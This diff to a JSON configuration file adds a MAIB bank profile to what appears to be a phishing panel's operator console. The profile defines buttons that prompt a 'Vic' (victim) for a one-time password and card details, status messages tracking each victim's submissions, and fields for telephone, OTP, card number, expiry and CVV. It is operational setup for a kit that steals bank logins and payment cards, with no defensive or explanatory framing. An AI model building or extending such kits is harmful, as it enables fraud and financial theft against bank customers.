@@ -85,6 +85,10 @@
       "id": "multi"
     },
     {
+      "name": "MAIB",
+      "id": "maib"
+    },
+    {
       "name": "MICB",
       "id": "micb"
     },
@@ -634,6 +638,83 @@
     "mainInfo": [
       {
         "usernameHeading": "username"
+      }
+    ]
+  },
+  "maib": {
+    "buttons": [
+      {
+        "name": "ASK TELEPHONE AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Telephone"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "telephone"
       }
     ]
   },
